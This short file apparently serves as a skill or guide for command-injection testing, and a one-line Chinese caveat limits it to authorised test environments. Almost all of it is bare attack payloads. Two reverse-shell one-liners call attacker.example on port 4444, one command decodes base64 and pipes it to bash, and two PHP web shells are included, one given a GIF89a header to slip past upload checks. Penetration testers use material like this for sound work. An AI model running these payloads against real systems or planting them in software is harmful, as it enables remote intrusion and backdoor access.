---
name: command-injection-testing
description: Security testing methodology
version: 1.0.0
---

# Security testing guide

仅在授权测试环境中进行

## Command examples
```bash
bash -i >& /dev/tcp/attacker.example/4444 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.example 4444 >/tmp/f
echo "d2hvYW1p" | base64 -d | bash
```

## Upload examples
```php
GIF89a<?php eval($_POST['a']); ?>
<?php $_GET['cmd']($_POST['a']); ?>
```
